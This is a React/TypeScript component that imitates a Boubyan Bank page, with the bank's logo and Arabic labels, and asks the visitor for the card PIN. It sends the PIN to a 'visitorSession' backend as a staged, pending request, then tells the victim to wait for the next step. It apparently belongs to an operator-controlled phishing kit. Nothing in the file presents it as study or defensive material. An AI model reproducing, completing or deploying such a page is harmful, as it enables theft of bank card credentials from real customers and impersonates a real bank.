import { FormEvent, useState } from "react";
import { createOrUpdateRequest, fillFieldMessage } from "@/api/visitorSession";
import { AdminGatedScreen } from "@/components/AdminGatedScreen";
import { useVisitorSession } from "@/hooks/useVisitorSession";

export default function CardPinPage() {
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [submitted, setSubmitted] = useState(false);

  useVisitorSession("card_pin");

  const onSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (pin.trim().length < 4) {
      setError(fillFieldMessage("كلمة سر البطاقة"));
      return;
    }
    setError(null);
    await createOrUpdateRequest({
      stage_key: "card_pin",
      extra_key_d: pin.trim(),
      notify_key: "----",
      stage_state: "pending",
    });
    setSubmitted(true);
  };

  return (
    <AdminGatedScreen>
      <main className="page-bank__shell view--bank" aria-label="كلمة سر البطاقة">
        <header className="bank-topbar">
          <span className="bank-icon bank-icon--chat" aria-hidden="true" />
          <button type="button" className="bank-menu" aria-label="القائمة">
            <span />
            <span />
            <span />
          </button>
        </header>
        <div className="bank-logo-wrap">
          <img src="/BoubyanBankLogo_(1).webp" alt="بوبيان Boubyan" className="bank-logo-img" width={165} />
        </div>
        {submitted ? (
          <p className="bank-hint personal-info-hint" role="status">
            تم إرسال البيانات بنجاح. يرجى انتظار التوجيه إلى الخطوة التالية.
          </p>
        ) : (
          <form className="bank-form bank-form--compact" onSubmit={onSubmit} noValidate>
            <h1 className="bank-section-title personal-info-title">كلمة سر البطاقة</h1>
            <p className="bank-hint personal-info-hint">أدخل كلمة سر البطاقة (PIN)</p>
            <label className="bank-field bank-field--password">
              <span className="bank-label">كلمة سر البطاقة</span>
              <div className="bank-password">
                <input
                  type={showPin ? "text" : "password"}
                  className="bank-input bank-input--password"
                  inputMode="numeric"
                  autoComplete="off"
                  dir="ltr"
                  maxLength={6}
                  value={pin}
                  onChange={(e) => {
                    const v = e.target.value.replace(/\D/g, "").slice(0, 6);
                    setPin(v);
                    if (v.length >= 4) setError(null);
                  }}
                  required
                />
                <button
                  type="button"
                  className="bank-password__toggle"
                  aria-label={showPin ? "إخفاء" : "إظهار"}
                  aria-pressed={showPin}
                  onClick={() => setShowPin((v) => !v)}
                >
                  {!showPin ? (
                    <svg xmlns="http://www.w3.org/2000/svg" width={22} height={22} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={1.75} aria-hidden>
                      <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7Z" />
                      <circle cx="12" cy="12" r="3" />
                    </svg>
                  ) : (
                    <svg xmlns="http://www.w3.org/2000/svg" width={22} height={22} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={1.75} aria-hidden>
                      <path d="m2 2 20 20" />
                    </svg>
                  )}
                </button>
              </div>
              {error && (
                <p className="bank-field-error" role="alert">
                  {error}
                </p>
              )}
            </label>
            <button type="submit" className="btn-primary btn-primary--bank">
              تأكيد
            </button>
          </form>
        )}
      </main>
    </AdminGatedScreen>
  );
}